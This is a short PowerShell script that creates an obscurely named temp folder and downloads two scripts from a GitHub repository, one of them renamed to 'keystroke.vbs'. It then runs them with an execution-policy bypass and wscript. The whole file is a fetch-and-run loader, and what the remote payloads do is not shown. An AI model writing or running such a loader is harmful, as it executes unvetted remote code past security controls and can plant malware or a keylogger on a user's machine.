$folder = "$env:TEMP\kAiZ3n"
New-Item -ItemType Directory -Path $folder -Force | Out-Null

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bruning-frighting/Windows-Internal/refs/heads/main/installerPython.ps1" -OutFile "$folder\installerPython.ps1"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bruning-frighting/Windows-Internal/refs/heads/main/click.vbs" -OutFile "$folder\keystroke.vbs"

Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$folder\installerPython.ps1`"" -NoNewWindow -Wait

Start-Process -FilePath "wscript.exe" -ArgumentList "`"$folder\keystroke.vbs`"" -NoNewWindow -Wait
